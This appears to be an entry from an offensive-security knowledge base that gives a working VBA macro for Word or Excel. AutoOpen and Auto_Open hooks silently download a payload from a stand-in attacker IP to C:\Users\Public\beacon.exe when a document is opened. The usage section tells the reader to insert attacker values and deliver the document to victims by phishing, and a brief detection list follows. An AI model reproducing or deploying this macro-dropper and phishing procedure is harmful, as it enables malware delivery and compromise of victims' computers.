---
type: code
language: vb
verified: true
created_at: '2023-04-06T03:56:23Z'
updated_at: '2023-04-10T20:36:49Z'
platforms:
  - Windows
tags:
  - vba
  - payload-download
  - office-macro
validated: true
---

# VBA-URLDownloadToFile-with-AutoOpen-for-Payload-Download

## Code

```vb
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean
    On Error GoTo Failed
    DownloadFileA = False
    'As directory must exist, this is a check
    If CreateObject("Scripting.FileSystemObject").FolderExists(CreateObject("Scripting.FileSystemObject").GetParentFolderName(DownloadPath)) = False Then Exit Function
    Dim returnValue As Long
    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0)
    'If return value is 0 and the file exist, then it is considered as downloaded correctly
    DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) > 0)
    Exit Function

Failed:
End Function

Sub AutoOpen()
    DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
End Sub


Sub Auto_Open()
    DownloadFileA "http://10.10.10.10/macro.exe", "C:\\Users\\Public\\beacon.exe"
End Sub
```

## Description

This VBA code defines a DownloadFileA function using the Windows URLDownloadToFile API to silently download a file from a remote URL to a local path. It includes AutoOpen and Auto_Open subroutines that trigger automatically when the macro-enabled Office document is opened, downloading the payload to C:\Users\Public\beacon.exe. Note: This downloads but does not execute; pair with an execution command in the payload or document.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| URL | Remote URL of the payload file | http://$_ATTACKER_IP/macro.exe |
| DownloadPath | Local path to save the file | C:\\Users\\Public\\$_FILENAME.exe |

## Usage

Paste this code into the VBA editor of a macro-enabled Word (.docm) or Excel (.xlsm) document. Customize URL and DownloadPath with attacker-controlled values. Deliver via phishing email. When the victim opens the file and enables macros, it downloads the payload. Use in conjunction with [[procedures/Generate-Malicious-VBA-Macro-for-Payload-Download-and-Execution-Using-MMG]] for obfuscated variants.

## Detection

- Enable VBA macro scanning in antivirus/EDR tools to detect URLDownloadToFile API calls.
- Monitor network traffic for unexpected HTTP downloads from Office processes (winword.exe, excel.exe).
- Check for new files in user-writable directories like C:\Users\Public\.
- Office Protected View and macro disabling prevent execution; log macro enablement events.

## Related

- [[procedures/Generate-Malicious-VBA-Macro-for-Payload-Download-and-Execution-Using-MMG]]
- [[tools/MaliciousMacroGenerator]]
